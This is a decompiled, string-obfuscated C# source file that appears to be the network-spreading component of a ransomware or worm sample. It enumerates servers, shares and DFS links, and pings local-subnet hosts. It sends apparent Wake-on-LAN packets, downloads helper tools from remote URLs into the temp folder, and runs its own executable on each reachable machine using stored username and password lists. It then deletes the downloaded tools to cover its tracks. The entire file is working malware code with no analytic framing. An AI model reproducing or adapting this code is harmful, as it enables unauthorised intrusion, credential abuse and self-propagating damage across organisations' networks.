using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

internal sealed class XkrLZpIpGzIUW
{
	public sealed class oUXBdjGkrzvAL
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum GNGyGoZvnEtSW
	{
		uKycDEWfgtmS = 1,
		xSiyVTGqxFfo,
		XNgbcXxCIQWV,
		yBbeSDODYlVfwXl,
		VjHgHqljVEiByuJ
	}

	public enum otpRlEoFBjrP
	{
		jLsnIxgkOICW,
		BrzibxxUHTqCRH,
		nDvKUTGsxU,
		yBlYDBDpXJe
	}

	public enum jfBDnrCLwhSyXX
	{
		qdAppWYuNtlg = 1,
		wmHngBvnSGYZZRh = 2,
		swRXBbLNjkLJ = 4,
		xvIIEXdLxod = 8,
		XdNQcsMcEkv = 16,
		tnnIayOplqT = 19
	}

	public enum JaiZZywDZVa
	{
		LNUXoiUJeF,
		ZFlMvRMmiPOSdpMSqN,
		UsvpuLEDSVdGb,
		XwOhFxdVVseF,
		eNmbsLTszTCPWU,
		bBfVEardeuaM,
		ZnvIkzkTBSxPdm,
		UCFgUUSsowSJ,
		TObiNMyVJS,
		ObrbWBqlvixw,
		ryXyVCbpsk,
		tRxRbtiIPcb
	}

	public sealed class xZWcgFFKtqP : IEnumerable
	{
		private enum AlwBRgEVzdgeJ
		{
			igjKUewJikTYIb = 0,
			nqBcrVabHUxjmXKC = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class KaspdgcGLrQ
		{
			public GNGyGoZvnEtSW ITdjZyuLWrXHpWX;

			public otpRlEoFBjrP TkdZfiTcelVjc;

			public JaiZZywDZVa LRQGIJhgWAgvIi;

			public jfBDnrCLwhSyXX niDtOyPEcIeGiy;

			public string MgGMDIyyxNfnAP;

			public string DCUPzYWmnCud;

			public string JmSmgOupGAjEm;

			public string FhOCCwJUOgbdDFy;
		}

		private ArrayList bNNoAUDEJRqNzlJp = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern AlwBRgEVzdgeJ WNetOpenEnumA(GNGyGoZvnEtSW dwScope, otpRlEoFBjrP dwType, jfBDnrCLwhSyXX dwUsage, KaspdgcGLrQ p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern AlwBRgEVzdgeJ WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern AlwBRgEVzdgeJ WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(KaspdgcGLrQ kaspdgcGLrQ_0, GNGyGoZvnEtSW gngyGoZvnEtSW_0, otpRlEoFBjrP otpRlEoFBjrP_0, jfBDnrCLwhSyXX jfBDnrCLwhSyXX_0, JaiZZywDZVa jaiZZywDZVa_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(gngyGoZvnEtSW_0, otpRlEoFBjrP_0, jfBDnrCLwhSyXX_0, kaspdgcGLrQ_0, out lphEnum) == AlwBRgEVzdgeJ.igjKUewJikTYIb)
			{
				AlwBRgEVzdgeJ alwBRgEVzdgeJ;
				do
				{
					alwBRgEVzdgeJ = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (alwBRgEVzdgeJ)
					{
					case AlwBRgEVzdgeJ.nqBcrVabHUxjmXKC:
						continue;
					case AlwBRgEVzdgeJ.igjKUewJikTYIb:
						Marshal.PtrToStructure(intPtr, kaspdgcGLrQ_0);
						if (kaspdgcGLrQ_0.LRQGIJhgWAgvIi == jaiZZywDZVa_0)
						{
							bNNoAUDEJRqNzlJp.Add(kaspdgcGLrQ_0.DCUPzYWmnCud);
						}
						if ((kaspdgcGLrQ_0.niDtOyPEcIeGiy & jfBDnrCLwhSyXX.wmHngBvnSGYZZRh) == jfBDnrCLwhSyXX.wmHngBvnSGYZZRh)
						{
							EnumerateServers(kaspdgcGLrQ_0, gngyGoZvnEtSW_0, otpRlEoFBjrP_0, jfBDnrCLwhSyXX_0, jaiZZywDZVa_0);
						}
						continue;
					}
					break;
				}
				while (alwBRgEVzdgeJ != AlwBRgEVzdgeJ.nqBcrVabHUxjmXKC);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public xZWcgFFKtqP(GNGyGoZvnEtSW gngyGoZvnEtSW_0, otpRlEoFBjrP otpRlEoFBjrP_0, jfBDnrCLwhSyXX jfBDnrCLwhSyXX_0, JaiZZywDZVa jaiZZywDZVa_0)
		{
			KaspdgcGLrQ kaspdgcGLrQ_ = new KaspdgcGLrQ();
			EnumerateServers(kaspdgcGLrQ_, gngyGoZvnEtSW_0, otpRlEoFBjrP_0, jfBDnrCLwhSyXX_0, jaiZZywDZVa_0);
		}

		public IEnumerator GetEnumerator()
		{
			return bNNoAUDEJRqNzlJp.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct UvLIKmgCUto
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string hhRwBPslfniXw;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string dqAApzgKub;

		public uint xQUlRAeZiYq;

		public uint ZajGRknVlIQI;

		public IntPtr BMLThQranhVc;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct JmpDDJpJDGxsJc
	{
		public int xQUlRAeZiYq;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string dzKMvnFUUZOjJ;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string kCMLjPvvPqcN;
	}

	public struct cnUXlZfcJgeyIX
	{
		public string EfLSObHMyQDC;

		public string[] UJuEjwUhILuf;

		public cnUXlZfcJgeyIX(string string_0, string[] string_1)
		{
			EfLSObHMyQDC = string_0;
			UJuEjwUhILuf = string_1;
		}
	}

	private sealed class fyJsqpBukpr
	{
		public string hbmLldvMCejK;

		public string trmbEgfjWs;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107392674)) && !string_0.StartsWith(getString_0(107392669)) && !string_0.StartsWith(getString_0(107392628)) && !string_0.Contains(getString_0(107393498))) || !BlQaGIgajUX(string_0))
			{
				return;
			}
			try
			{
				if (yIZYKSYRaZXoZvGddM.lAoTEijSeOCrur == getString_0(107396907))
				{
					for (int i = 0; i < PnvVzbsgauow.Count; i++)
					{
						yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(getString_0(107392647), getString_0(107392634) + string_0 + getString_0(107392593) + PnvVzbsgauow[i] + getString_0(107392612) + SpnhDMEosoca[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(getString_0(107392647), getString_0(107392634) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (yIZYKSYRaZXoZvGddM.lAoTEijSeOCrur == getString_0(107396907))
			{
				for (int j = 0; j < PnvVzbsgauow.Count; j++)
				{
					if (yIZYKSYRaZXoZvGddM.nCFuCxDDXURK)
					{
						if (File.Exists(hbmLldvMCejK))
						{
							yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(hbmLldvMCejK, getString_0(107391130) + string_0 + getString_0(107404243) + PnvVzbsgauow[j] + getString_0(107404234) + SpnhDMEosoca[j] + getString_0(107404257) + Assembly.GetEntryAssembly()!.Location + getString_0(107391084));
						}
					}
					else if (File.Exists(trmbEgfjWs))
					{
						yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(trmbEgfjWs, getString_0(107391130) + string_0 + getString_0(107404243) + PnvVzbsgauow[j] + getString_0(107404234) + SpnhDMEosoca[j] + getString_0(107403712) + Assembly.GetEntryAssembly()!.Location + getString_0(107391084));
					}
				}
			}
			else if (yIZYKSYRaZXoZvGddM.nCFuCxDDXURK)
			{
				if (File.Exists(hbmLldvMCejK))
				{
					yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(hbmLldvMCejK, getString_0(107391130) + string_0 + getString_0(107403655) + Assembly.GetEntryAssembly()!.Location + getString_0(107391084));
				}
			}
			else if (File.Exists(trmbEgfjWs))
			{
				yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(trmbEgfjWs, getString_0(107391130) + string_0 + getString_0(107403622) + Assembly.GetEntryAssembly()!.Location + getString_0(107391084));
			}
		}

		static fyJsqpBukpr()
		{
			Strings.CreateGetStringDelegate(typeof(fyJsqpBukpr));
		}
	}

	private sealed class uLzXSxdHcup
	{
		public string aZsanEknJmuSHIHa;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != aZsanEknJmuSHIHa;
		}
	}

	public static List<string> lAXFGpvVLdXNC;

	public static string IuSDpIVEPpgRh;

	public static List<string> PnvVzbsgauow;

	public static List<string> SpnhDMEosoca;

	public static List<string> lpInoxfoeYwqhpr;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<oUXBdjGkrzvAL> rFSunOZkibLORh()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107397247);
			process.StartInfo.Arguments = getString_0(107404704);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<oUXBdjGkrzvAL> list = new List<oUXBdjGkrzvAL>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107404719))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new oUXBdjGkrzvAL
						{
							ServerName = getString_0(107396772) + stringBuilder.ToString() + getString_0(107404162)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string WlhhcTJtZuLUUr, int jRDeujHHJXSpF, int yzrUKMZaSQ, out IntPtr KJpzXEtvdXbPA, [MarshalAs(UnmanagedType.I4)] out int WndjfivPxnywTZZ, [MarshalAs(UnmanagedType.I4)] ref int mPgmEOolBqzaF);

	public static List<cnUXlZfcJgeyIX> EaxTAxWowTzouSdB(string string_0)
	{
		try
		{
			List<cnUXlZfcJgeyIX> list = new List<cnUXlZfcJgeyIX>();
			IntPtr KJpzXEtvdXbPA = default(IntPtr);
			int WndjfivPxnywTZZ = 0;
			int mPgmEOolBqzaF = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out KJpzXEtvdXbPA, out WndjfivPxnywTZZ, ref mPgmEOolBqzaF) == 0)
			{
				for (int i = 0; i < WndjfivPxnywTZZ; i++)
				{
					UvLIKmgCUto uvLIKmgCUto = (UvLIKmgCUto)Marshal.PtrToStructure(KJpzXEtvdXbPA + i * Marshal.SizeOf(typeof(UvLIKmgCUto)), typeof(UvLIKmgCUto));
					if (uvLIKmgCUto.hhRwBPslfniXw == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < uvLIKmgCUto.ZajGRknVlIQI; j++)
					{
						IntPtr ptr = new IntPtr(uvLIKmgCUto.BMLThQranhVc.ToInt64() + j * Marshal.SizeOf(typeof(JmpDDJpJDGxsJc)));
						JmpDDJpJDGxsJc jmpDDJpJDGxsJc = (JmpDDJpJDGxsJc)Marshal.PtrToStructure(ptr, typeof(JmpDDJpJDGxsJc));
						if (jmpDDJpJDGxsJc.xQUlRAeZiYq == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107391073),
								jmpDDJpJDGxsJc.dzKMvnFUUZOjJ,
								jmpDDJpJDGxsJc.kCMLjPvvPqcN
							}));
						}
					}
					string text = uvLIKmgCUto.hhRwBPslfniXw.Replace(string_0, getString_0(107393441));
					if (text.StartsWith(getString_0(107396772)))
					{
						text = text.Substring(1);
					}
					list.Add(new cnUXlZfcJgeyIX(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void WcGaNTogElcxHCFa()
	{
		yIZYKSYRaZXoZvGddM.PqGDLlSfOjAxfa(getString_0(107404121));
		List<oUXBdjGkrzvAL> list = rFSunOZkibLORh();
		List<cnUXlZfcJgeyIX> list2 = EaxTAxWowTzouSdB(Environment.MachineName);
		if (list2 != null)
		{
			foreach (cnUXlZfcJgeyIX item in list2)
			{
				string[] uJuEjwUhILuf = item.UJuEjwUhILuf;
				foreach (string text in uJuEjwUhILuf)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (yIZYKSYRaZXoZvGddM.lAoTEijSeOCrur == getString_0(107396850))
						{
							for (int j = 0; j < PnvVzbsgauow.Count; j++)
							{
								yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(getString_0(107392590), getString_0(107392437) + text + getString_0(107392536) + PnvVzbsgauow[j] + getString_0(107392555) + SpnhDMEosoca[j]);
							}
						}
						else
						{
							yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(getString_0(107392590), getString_0(107392437) + text);
						}
						yIZYKSYRaZXoZvGddM.PelwIoYLMluwkT.Add(text.Replace(getString_0(107391054), getString_0(107393441)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (oUXBdjGkrzvAL item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (yIZYKSYRaZXoZvGddM.lAoTEijSeOCrur == getString_0(107396850))
				{
					for (int k = 0; k < PnvVzbsgauow.Count; k++)
					{
						yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(getString_0(107392590), getString_0(107392437) + item2.ServerName + getString_0(107392536) + PnvVzbsgauow[k] + getString_0(107392555) + SpnhDMEosoca[k]);
					}
				}
				else
				{
					yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(getString_0(107392590), getString_0(107392437) + item2.ServerName);
				}
				yIZYKSYRaZXoZvGddM.PelwIoYLMluwkT.Add(item2.ServerName.Replace(getString_0(107391054), getString_0(107393441)));
			}
			catch
			{
			}
		}
	}

	public static void YjYibZIjKubHuQj()
	{
		fyJsqpBukpr CS_0024_003C_003E8__locals0 = new fyJsqpBukpr();
		List<OwVfFGsvPj> list = OwVfFGsvPj.HITVUyyaRenlpF();
		foreach (OwVfFGsvPj item in list)
		{
			lAXFGpvVLdXNC.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.hbmLldvMCejK = getString_0(107393441);
		CS_0024_003C_003E8__locals0.trmbEgfjWs = getString_0(107393441);
		try
		{
			CS_0024_003C_003E8__locals0.hbmLldvMCejK = GXEkVEiRDDiTd();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.trmbEgfjWs = auFcqjmMKhVeu();
		}
		catch
		{
		}
		foreach (OwVfFGsvPj item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107392617)) || item2.IPAddress.StartsWith(getString_0(107392612)) || item2.IPAddress.StartsWith(getString_0(107392571)) || item2.IPAddress.Contains(getString_0(107393441)))
				{
					pHdfjJfHxCgmN.ajjFAdLlgZWFmEQ(item2.MacAddress, item2.IPAddress, getString_0(107404068));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(lAXFGpvVLdXNC, delegate(string string_0)
			{
				if ((string_0.StartsWith(fyJsqpBukpr.getString_0(107392674)) || string_0.StartsWith(fyJsqpBukpr.getString_0(107392669)) || string_0.StartsWith(fyJsqpBukpr.getString_0(107392628)) || string_0.Contains(fyJsqpBukpr.getString_0(107393498))) && BlQaGIgajUX(string_0))
				{
					try
					{
						if (yIZYKSYRaZXoZvGddM.lAoTEijSeOCrur == fyJsqpBukpr.getString_0(107396907))
						{
							for (int i = 0; i < PnvVzbsgauow.Count; i++)
							{
								yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(fyJsqpBukpr.getString_0(107392647), fyJsqpBukpr.getString_0(107392634) + string_0 + fyJsqpBukpr.getString_0(107392593) + PnvVzbsgauow[i] + fyJsqpBukpr.getString_0(107392612) + SpnhDMEosoca[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(fyJsqpBukpr.getString_0(107392647), fyJsqpBukpr.getString_0(107392634) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (yIZYKSYRaZXoZvGddM.lAoTEijSeOCrur == fyJsqpBukpr.getString_0(107396907))
					{
						for (int j = 0; j < PnvVzbsgauow.Count; j++)
						{
							if (yIZYKSYRaZXoZvGddM.nCFuCxDDXURK)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.hbmLldvMCejK))
								{
									yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(CS_0024_003C_003E8__locals0.hbmLldvMCejK, fyJsqpBukpr.getString_0(107391130) + string_0 + fyJsqpBukpr.getString_0(107404243) + PnvVzbsgauow[j] + fyJsqpBukpr.getString_0(107404234) + SpnhDMEosoca[j] + fyJsqpBukpr.getString_0(107404257) + Assembly.GetEntryAssembly()!.Location + fyJsqpBukpr.getString_0(107391084));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.trmbEgfjWs))
							{
								yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(CS_0024_003C_003E8__locals0.trmbEgfjWs, fyJsqpBukpr.getString_0(107391130) + string_0 + fyJsqpBukpr.getString_0(107404243) + PnvVzbsgauow[j] + fyJsqpBukpr.getString_0(107404234) + SpnhDMEosoca[j] + fyJsqpBukpr.getString_0(107403712) + Assembly.GetEntryAssembly()!.Location + fyJsqpBukpr.getString_0(107391084));
							}
						}
					}
					else if (yIZYKSYRaZXoZvGddM.nCFuCxDDXURK)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.hbmLldvMCejK))
						{
							yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(CS_0024_003C_003E8__locals0.hbmLldvMCejK, fyJsqpBukpr.getString_0(107391130) + string_0 + fyJsqpBukpr.getString_0(107403655) + Assembly.GetEntryAssembly()!.Location + fyJsqpBukpr.getString_0(107391084));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.trmbEgfjWs))
					{
						yIZYKSYRaZXoZvGddM.SyapfBslvXsCZq(CS_0024_003C_003E8__locals0.trmbEgfjWs, fyJsqpBukpr.getString_0(107391130) + string_0 + fyJsqpBukpr.getString_0(107403622) + Assembly.GetEntryAssembly()!.Location + fyJsqpBukpr.getString_0(107391084));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.hbmLldvMCejK))
			{
				File.Delete(CS_0024_003C_003E8__locals0.hbmLldvMCejK);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.trmbEgfjWs))
			{
				File.Delete(CS_0024_003C_003E8__locals0.trmbEgfjWs);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string GXEkVEiRDDiTd()
	{
		if (IntPtr.Size == 8)
		{
			return qSSmhkocOtdfC(new Uri(yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107404047))));
		}
		return qSSmhkocOtdfC(new Uri(yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107404047))));
	}

	public static string auFcqjmMKhVeu()
	{
		if (IntPtr.Size == 8)
		{
			return qSSmhkocOtdfC(new Uri(yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107403934))));
		}
		return qSSmhkocOtdfC(new Uri(yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107404369))));
	}

	public static bool BlQaGIgajUX(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string qSSmhkocOtdfC(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107404328), getString_0(107393441)).Remove(0, 3) + getString_0(107404323);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> jCBfcqLeIJiovDQ()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107404282));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107404217)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107404236));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				uLzXSxdHcup CS_0024_003C_003E8__locals0 = new uLzXSxdHcup();
				CS_0024_003C_003E8__locals0.aZsanEknJmuSHIHa = array4[j];
				if (CS_0024_003C_003E8__locals0.aZsanEknJmuSHIHa.Contains(getString_0(107404191)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.aZsanEknJmuSHIHa).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static XkrLZpIpGzIUW()
	{
		Strings.CreateGetStringDelegate(typeof(XkrLZpIpGzIUW));
		lAXFGpvVLdXNC = new List<string>();
		IuSDpIVEPpgRh = getString_0(107393441);
		PnvVzbsgauow = new List<string>();
		SpnhDMEosoca = new List<string>();
		lpInoxfoeYwqhpr = new List<string>();
	}
}
